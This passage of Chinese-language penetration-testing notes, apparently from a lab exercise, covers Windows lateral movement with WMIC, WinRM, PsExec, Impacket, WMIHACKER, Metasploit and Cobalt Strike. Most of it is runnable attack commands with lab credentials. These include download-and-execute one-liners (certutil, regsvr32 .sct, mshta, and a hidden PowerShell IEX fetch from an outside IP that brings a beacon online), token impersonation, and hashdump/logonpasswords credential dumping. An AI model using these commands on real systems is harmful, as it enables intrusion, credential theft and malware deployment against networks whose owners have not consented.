style="zoom:50%;" /><ul><li>另外在启动服务类型中分为本地系统启动和远程网络启动。注意最后一项</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131630098.png" alt="image-20220813163020930" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\10.10.10.201 qc test</span><br><span class="line"></span><br><span class="line">qc--------------查询服务的配置信息。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307785.png" alt="image-20220808130752669" style="zoom:50%;" /><h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><h3 id="WMIC简介"><a href="#WMIC简介" class="headerlink" title="WMIC简介"></a>WMIC简介</h3><p>WMI:(Windows Management Instrumentation Windows 管理规范)，是用户管理本地和远程计算机的一种模型。通过它<strong>可以访问、配置、管理和监视几乎所有的Windows资源</strong>。WMI的语法十分简单，基本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。</p><p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。</p><p><strong>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问,它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</strong> </p><p>而WMIC是为WMI提供的命令行界面。</p><blockquote><p>详细参考：<a href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic">https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic</a><br><a href="https://blog.csdn.net/discover2210212455/article/details/82711930">https://blog.csdn.net/discover2210212455/article/details/82711930</a></p></blockquote><h4 id="命令使用条件"><a href="#命令使用条件" class="headerlink" title="命令使用条件"></a>命令使用条件</h4><ol><li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li><li>防火墙允许135、445等端口通信</li></ol><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>实际上wmic能对本地主机做什么操作 就能对远程主机做什么操作</p><ul><li>查询进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.30 /user:pc\administrator /password:1qaz@WSX process list brief</span><br></pre></td></tr></table></figure><p><strong>WMI不支持执行命令，而是支持执行文件</strong>，可以通过加相应的参数执行命令，比如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd.exe /c ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>利用create创建进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process call create /?</span><br><span class="line">调用                    [ 内/外 ]参数类型(&amp;T)状态        </span><br><span class="line">====                    ===========================        </span><br><span class="line">Create                  [IN ]CommandLine(STRING)                    (null)</span><br><span class="line">                        [IN ]CurrentDirectory(STRING)</span><br><span class="line">                        [IN ]ProcessStartupInformation(OBJECT)</span><br><span class="line">                        [OUT]ProcessId(UINT32)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c calc.exe&quot;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><blockquote><p>如果出现User credentials cannot be used for local connections,应该是调用calc.exe程序权限不够的问题</p></blockquote></li><li><blockquote><p>如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用</p></blockquote></li></ul><p><strong>wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。</strong></p><ul><li>下载远程文件并执行上线</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c  certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe</span><br><span class="line">是录播中的知识 文件下载</span><br><span class="line">我们可以用Windows下管理证书的certutil.exe程序下载远程主机的恶意文件，保存在c:/windows/temp/test.exe目录，再&amp;之后执行程序上线</span><br><span class="line">注意这个地方的远程主机（指的是我们已经拿下的web机器，因为内网pc机器不出网，所以只好放在这台机器上的web服务，给内网目标主机下载）</span><br><span class="line"></span><br><span class="line">实际上，当我们内网主机不能出网的时候，我们就可以通过在拿下的机器上做文章，放文件 </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081313574.png" alt="image-20220808131343441"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;regsvr32 /s /n /u /i:http://192.168.78.117:8080/feY7nzY.sct scrobj.dll&quot;</span><br><span class="line"></span><br><span class="line">regsvr32 是com组件注册的一个命令。</span><br><span class="line">msf可以生成sct的文件，再通过远程加载sct，即可上线</span><br></pre></td></tr></table></figure><h3 id="msf利用wmic"><a href="#msf利用wmic" class="headerlink" title="msf利用wmic"></a>msf利用wmic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/wmi) &gt; options</span><br><span class="line">使用该模块，提供账户密码，就可以通过wmic执行命令~~~</span><br><span class="line">需要注意防火墙</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208220052488.png" alt="image-20220822005215206"></p><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><h3 id="WinRM简介"><a href="#WinRM简介" class="headerlink" title="WinRM简介"></a>WinRM简介</h3><p>WinRM 指的是Windows远程管理服务，通过<strong>远程连接winRM模块可以操作windows命令行</strong>，默认监听端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。低于此版本要手动开启（靶场的PC机器和web机器都没有开启，需要手动开启）</p><h3 id="开启WinRM"><a href="#开启WinRM" class="headerlink" title="开启WinRM"></a>开启WinRM</h3><ul><li>判断本机是否开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm enumerate winrm/config/listener</span><br><span class="line">下图表示没有开启</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131908850.png" alt="image-20220813190855609" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr 5985</span><br><span class="line">wmic service list brief | findstr WinRM</span><br></pre></td></tr></table></figure><ul><li>判断目标主机是否开启WinRM服务</li></ul><p>查看远程主机是否开启WinRM服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerScan.exe -h 10.10.10.30 -p 5985,5986</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315752.png" alt="image-20220808131520618"></p><ul><li>查看远程WinRM服务是否正常：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test-wsman 10.10.10.30</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315465.png" alt="image-20220808131537317"></p><ul><li>命令开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316922.png" alt="image-20220808131617740" style="zoom: 50%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316137.png" alt="image-20220808131639012"></p><ul><li>允许远程主机访问及访问远程主机（即开启允许外连）</li></ul><p>WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081317247.png" alt="image-20220808131705064" style="zoom:50%;" /><h3 id="Winrs执行命令"><a href="#Winrs执行命令" class="headerlink" title="Winrs执行命令"></a>Winrs执行命令</h3><p>winrs内置命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e ipconfig</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="WinRM横向移动"><a href="#WinRM横向移动" class="headerlink" title="WinRM横向移动"></a>WinRM横向移动</h3><ul><li>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure><p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081318509.png" alt="image-20220808131818326" style="zoom:50%;" /><ul><li>在远程机器上打开进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><ul><li>在远程机器上创建服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\59.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br><span class="line"></span><br><span class="line">调用Win32_Service类</span><br></pre></td></tr></table></figure><ul><li>在远程机器上启动服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081319710.png" alt="image-20220808131946534" style="zoom:50%;" /><h1 id="横向移动-外部工具篇"><a href="#横向移动-外部工具篇" class="headerlink" title="横向移动-外部工具篇"></a>横向移动-外部工具篇</h1><h2 id="Smbexec、Psexec"><a href="#Smbexec、Psexec" class="headerlink" title="Smbexec、Psexec"></a>Smbexec、Psexec</h2><h3 id="Psexec简介"><a href="#Psexec简介" class="headerlink" title="Psexec简介"></a>Psexec简介</h3><p>PsExec是一种轻巧的telnet替代品，可让您在其他系统上<strong>执行进程，并为控制台应用程序提供完整的交互性，而无需手动安装客户端软件</strong>。</p><blockquote><p>在”H:\ATTACK\权限提升\SysinternalsSuite\PsExec.exe”目录中有</p><p>psexec下载地址：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a><br>impacket下载地址：<br>py：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>exe：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><p>impacket相较于微软官方的sysinternalsuits更好用</p></blockquote><h3 id="Psexec原理"><a href="#Psexec原理" class="headerlink" title="Psexec原理"></a>Psexec原理</h3><ol><li>ipc$ 连接,释放 Psexesvc.exe（即将服务程序复制到目标主机上）</li><li>通过服务管理 OpenSCManager 打开受害者机器上服务控制管理器的句柄（也就是打开服务控制管理器）</li><li>通过 CreateService 创建服务</li><li>获取服务句柄 OpenService 使用 StartService 启动服务</li></ol><h3 id="Psexec使用前提"><a href="#Psexec使用前提" class="headerlink" title="Psexec使用前提"></a>Psexec使用前提</h3><ol><li>对方主机开启了 admin$  共享，如果关闭了 admin$ 共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用 administrator 用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li></ol><h3 id="PsExec-exe使用"><a href="#PsExec-exe使用" class="headerlink" title="PsExec.exe使用"></a>PsExec.exe使用</h3><p>微软官方工具包</p><ul><li>直接使用</li></ul><blockquote><ul><li><p>第一次运行会弹框,输入 –accepteula 这个参数就可以绕过</p></li><li><p>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\PsExec.exe \\192.168.10.201 -u de1ay\Administrator -p 1qaz@WSX3e -s cmd.exe -accepteula</span><br></pre></td></tr></table></figure><ul><li>建立IPC连接，无需输入密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br><span class="line">反弹cmd：</span><br><span class="line">psexec.exe \\10.10.10.201 -s cmd.exe -accepteula</span><br><span class="line">执行命令：</span><br><span class="line">psexec.exe \\10.10.10.201 whoami -accepteula</span><br></pre></td></tr></table></figure><ul><li>重要参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">-d 不等待程序执行完就返回</span><br><span class="line">比如想上传一个本地的getpass到你远程连接的服务器上去运行（很方便）:</span><br><span class="line">Psexec.exe \\ip -u user -p pass -c c:\getpass.exe –d</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e whoami</span><br><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e mshta http://192.168.78.117:8088/download/file.ext</span><br></pre></td></tr></table></figure><p>psexec 传递命令时不要添加双引号否则会爆 “系统找不到指定的文件” 的错误。</p><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>impacket套件中的Psexec与官方psexec.exe相比会自动删除服务，增加隐蔽性</p><ul><li>交互式命令行</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line"></span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....请求文件共享</span><br><span class="line">[*] Found writable share ADMIN$找到一个可写的文件共享</span><br><span class="line">[*] Uploading file DabwFVJj.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service KNri on 10.10.10.201.....</span><br><span class="line">[*] Starting service KNri.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit退出会会自动清理文件</span><br><span class="line">[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service KNri.....</span><br><span class="line">[*] Removing service KNri.....</span><br><span class="line">[*] Removing file DabwFVJj.exe.....</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081329748.png" alt="image-20220808132958587" style="zoom:33%;" /><ul><li>直接执行命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.exe de1ay/administrator:1qaz@WSX3e@10.10.10.201 whoami</span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file SLZVAxLl.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service slqx on 10.10.10.201.....</span><br><span class="line">[*] Starting service slqx.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">nt authority\system</span><br><span class="line">[*] Process whoami finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service slqx.....</span><br><span class="line">[*] Removing service slqx.....</span><br><span class="line">[*] Removing file SLZVAxLl.exe.....</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 whoami</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 mshta http://192.168.78.104:80/download/file.ext</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081331667.png" alt="image-20220808133147513" style="zoom:50%;" /><h3 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h3><p>impacket套件中smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。<br>445端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;smbexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line">Impacket v0.9.17 - Copyright 2019 SecureAuth Corporation</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br></pre></td></tr></table></figure><h2 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h2><h3 id="Wmiexec-vbs"><a href="#Wmiexec-vbs" class="headerlink" title="Wmiexec.vbs"></a>Wmiexec.vbs</h3><p>基本原理：当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹。最后，通过FSO组件访问远程共享文件夹（需要用到445端口）中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。</p><ol><li>单命令执行</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081342452.png" alt="image-20220808134239306" style="zoom:50%;" /><ol start="2"><li>半交互模式</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cscript.exe //nologo c:\wmiexec.vbs /shell ip username password</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081343522.png" alt="image-20220808134319303" style="zoom:50%;" /><ol start="3"><li>注意</li></ol><p>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：Const FileName &#x3D; “wmi1.dll”,也可以加入-persist参数(后台运行)</p><p>非域用户登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现 WMIEXEC ERROR: Access is denied</p><h3 id="WMI-HACKER"><a href="#WMI-HACKER" class="headerlink" title="WMI-HACKER"></a>WMI-HACKER</h3><p>介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。此工具通过135端口进行命令执行，读取执行结果以及进行文件传输时无需445端口，通过把执行结果写入注册表中，然后进行读取。</p><p>主要功能：1、命令执行；2、文件上传；3、文件下载<br>使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //nologo WMIHACKER_0.6.vbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><blockquote><p>360-Linton-Lab&#x2F;WMIHACKER(连接 上GitHub上康康)</p></blockquote><h3 id="wmicmd-exe"><a href="#wmicmd-exe" class="headerlink" title="wmicmd.exe"></a>wmicmd.exe</h3><p>wmicmd命令回显（工作组）</p><blockquote><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIcmd.exe -h 10.10.10.201 -u administrator -p 1qaz@WSX -d . -c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="Wmiexec-py"><a href="#Wmiexec-py" class="headerlink" title="Wmiexec.py"></a>Wmiexec.py</h3><p>Impacket套件<br>原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令<br>的结果和获取半交互式的shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -share admin$ administrator:1qaz@WSX@10.10.10.201</span><br></pre></td></tr></table></figure><h2 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h2><p>Kali自带pth工具集</p><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe -U administrator%1qaz@WSX3e --system --ostype=1 //10.10.10.201 command</span><br></pre></td></tr></table></figure><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe  -U de1ay/administrator%Aatest --system --ostype=1 //192.168.3.90 command</span><br></pre></td></tr></table></figure><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>和前面的psexec工具类似，该工具集成到msf之中，注意哈，msf5中的下面某些模块在msf6中是没有用了的~~工具嘛，失效了就换下一个~ 何必单恋一支花-</p><p>这种psexec就是利用账号密码，登录后再执行命令~~~</p><p><del><code>auxiliary/admin/smb/ms17_010_command</code>在msf6模块也是有用的</del>，出了点问题</p><ul><li>执行<strong>单个命令</strong>的PTH模块</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; options</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command whoami</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBUser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBPass 1qaz@WSX3e</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><ul><li>执行直接就<strong>获取到meterpreter</strong>的PTH模块(有用)</li></ul><p>对域内知晓密码的机器进行攻击~~此刻的目标是DC</p><p>需要注意的是：</p><p>我们此时攻击的目标是内网机器，我们无法直接访问到，需要搭建代理，并且建立正向连接访问代理，再对内网的DC机器进行攻击！这一点是很重要的~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">另外不要忘记添加代理，添加完代理后，msf会自动帮我们转发相应的请求</span><br><span class="line">#设置正向payload，建立正向连接</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt;set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 10.10.10.0/24    添加到10.10.10.0网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br><span class="line">#搭建socks代理</span><br><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">exploit –j </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec_psh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081421408.png" alt="image-20220808142121175" style="zoom:50%;" /><h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><ul><li>Token简介</li></ul><p>Windows有两种类型的Token：</p><ul><li><blockquote><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p></blockquote></li><li><blockquote><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p></blockquote></li></ul><p>两种token只在系统重启后清除</p><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><p>这也就意味着 当主机上某台主机登录过，那么可能会遗留下相应的token，我们窃取之就可以以其身份登录~~~</p><p>可以通过此方法提权至域管用户，当然得要域管遗留下来这个token</p><ul><li>Metasploit</li></ul><blockquote><p>在Metasploit中，可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载incognito模块：</span><br><span class="line">load incognito</span><br><span class="line">列举token：</span><br><span class="line">list_tokens -u</span><br><span class="line">查看当前token：</span><br><span class="line">getuid</span><br><span class="line">提示至system权限：</span><br><span class="line">getsystem</span><br><span class="line">token窃取：</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">从进程窃取token：</span><br><span class="line">steal_token 4500</span><br><span class="line">返回之前token：</span><br><span class="line">rev2self、drop_token</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081427321.png" alt="image-20220808142725127" style="zoom:50%;" /><h2 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h2><p>首先通过powershell脚本上线：(记得关闭杀软)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://124.223.217.243:1232/a1&#x27;))&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208202251708.png" alt="image-20220820225108246" style="zoom:50%;" /><h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><p>beacon执行内置mimikatz的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><p>PortScan扫描存活主机，随便选几个端口，先探测存活再去扫描端口，可以探测存活主机 